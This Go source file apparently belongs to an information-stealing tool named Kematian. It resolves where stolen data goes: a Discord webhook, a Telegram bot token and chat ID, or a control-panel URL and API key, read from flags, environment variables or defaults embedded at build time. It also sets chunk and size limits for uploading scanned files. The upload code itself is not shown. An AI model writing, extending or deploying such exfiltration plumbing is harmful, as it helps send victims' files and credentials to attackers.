package main

import (
	"os"
	"strings"
)

// Set at build time via -ldflags "-X main.defaultTelegramBotToken=... -X main.defaultTelegramChatID=..."
var defaultTelegramBotToken string
var defaultTelegramChatID string
var defaultPanelURL string
var defaultPanelAPIKey string

type uploadConfig struct {
	DiscordWebhook   string
	TelegramBotToken string
	TelegramChatID   string
	PanelURL         string
	PanelAPIKey      string
	Hostname         string
	OS               string
	Arch             string
}

func resolveUploadConfig(webhookFlag, telegramTokenFlag, telegramChatFlag, panelURLFlag, panelKeyFlag string) uploadConfig {
	cfg := uploadConfig{
		DiscordWebhook:   strings.TrimSpace(webhookFlag),
		TelegramBotToken: strings.TrimSpace(telegramTokenFlag),
		TelegramChatID:   strings.TrimSpace(telegramChatFlag),
		PanelURL:         strings.TrimSpace(panelURLFlag),
		PanelAPIKey:      strings.TrimSpace(panelKeyFlag),
	}

	if cfg.DiscordWebhook == "" {
		cfg.DiscordWebhook = strings.TrimSpace(os.Getenv("DISCORD_WEBHOOK_URL"))
	}
	if cfg.DiscordWebhook == "" {
		cfg.DiscordWebhook = strings.TrimSpace(os.Getenv("KEMATIAN_WEBHOOK_URL"))
	}
	if cfg.DiscordWebhook == "" {
		cfg.DiscordWebhook = strings.TrimSpace(defaultWebhook)
	}

	if cfg.TelegramBotToken == "" {
		cfg.TelegramBotToken = strings.TrimSpace(os.Getenv("TELEGRAM_BOT_TOKEN"))
	}
	if cfg.TelegramBotToken == "" {
		cfg.TelegramBotToken = strings.TrimSpace(defaultTelegramBotToken)
	}

	if cfg.TelegramChatID == "" {
		cfg.TelegramChatID = strings.TrimSpace(os.Getenv("TELEGRAM_CHAT_ID"))
	}
	if cfg.TelegramChatID == "" {
		cfg.TelegramChatID = strings.TrimSpace(defaultTelegramChatID)
	}

	if cfg.PanelURL == "" {
		cfg.PanelURL = strings.TrimSpace(os.Getenv("PANEL_URL"))
	}
	if cfg.PanelURL == "" {
		cfg.PanelURL = strings.TrimSpace(os.Getenv("KEMATIAN_PANEL_URL"))
	}
	if cfg.PanelURL == "" {
		cfg.PanelURL = strings.TrimSpace(defaultPanelURL)
	}

	if cfg.PanelAPIKey == "" {
		cfg.PanelAPIKey = strings.TrimSpace(os.Getenv("PANEL_API_KEY"))
	}
	if cfg.PanelAPIKey == "" {
		cfg.PanelAPIKey = strings.TrimSpace(os.Getenv("KEMATIAN_PANEL_API_KEY"))
	}
	if cfg.PanelAPIKey == "" {
		cfg.PanelAPIKey = strings.TrimSpace(defaultPanelAPIKey)
	}

	return cfg
}

func (c uploadConfig) useDiscord() bool {
	return c.DiscordWebhook != ""
}

func (c uploadConfig) useTelegram() bool {
	return c.TelegramBotToken != "" && c.TelegramChatID != ""
}

func (c uploadConfig) usePanel() bool {
	return c.PanelURL != ""
}

func (c uploadConfig) valid() bool {
	return c.useDiscord() || c.useTelegram() || c.usePanel()
}

func (c uploadConfig) maxChunkBytes() int {
	if c.useDiscord() {
		return maxDiscordUpload
	}
	return maxTelegramUpload
}

func (c uploadConfig) maxScannedFileBytes() int64 {
	if c.useDiscord() {
		return int64(maxScannedFileUploadSize)
	}
	return int64(maxTelegramUpload - 3*1024*1024)
}